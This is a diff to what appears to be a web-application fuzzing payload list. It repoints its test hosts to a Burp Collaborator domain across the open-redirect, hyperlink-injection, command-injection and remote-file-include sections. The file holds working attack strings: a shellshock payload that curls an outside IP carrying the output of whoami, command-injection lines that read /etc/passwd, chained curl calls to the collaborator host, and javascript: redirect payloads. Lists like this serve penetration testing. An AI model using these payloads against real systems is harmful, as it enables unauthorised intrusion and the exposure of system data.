@@ -38,17 +38,17 @@ false
 8
 9
 #############OPEN REDIRECT
-http://xss.whitehatsec.com
+http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 https://whitehatsec.com
-.xss.whitehatsec.com
+.nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 .whitehatsec.com
-http://xss.whitehatsec.com
-//xss.whitehatsec.com
+http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
+//nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 whitehatsec.com
-xss.whitehatsec.com
+nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 #############HYPERLINK INJECTION
 javascript:alert(1)//INJECTX
-javascript:document.location=http://xss.whitehatsec.com
+javascript:document.location=http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 #############REFLECTED XSS
 INJECTXXXXXXXXXXXXXXXXXXXXXXXXXX
 <INJECTX><!-- //INJECTX -->
@@ -221,8 +221,8 @@ a;id\n
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 $(`cat /etc/passwd`)
 cat /etc/passwd
-| curl http://xss.whitehatsec.com/.testing/rce.txt
-& curl http://xss.whitehatsec.com/.testing/rce.txt
+| curl http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce.txt
+& curl http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce.txt
 ; curl https://whitehatsec.com/.testing/rce_vuln.txt
 && curl https://whitehatsec.com/.testing/rce_vuln.txt
 curl https://whitehatsec.com/.testing/rce_vuln.txt
@@ -341,7 +341,11 @@ $;/usr/bin/id
 )
 (
 #############REMOTE FILE INCLUDE
-http://xss.whitehatsec.com/.testing/whitehatsec.txt
-http://xss.whitehatsec.com/.testing/whitehatsec%00
-https://whitehatsec.com/.testing/whitehatsec.txt
-https://whitehatsec.com/.testing/whitehatsec.txt%00
+http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/whitehatsec.txt
+http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/whitehatsec%00
+https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/whitehatsec.txt
+https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/whitehatsec.txt%00
+#############EMAIL ADDRESS
+bob@nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
+#############Simple Collab
+nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
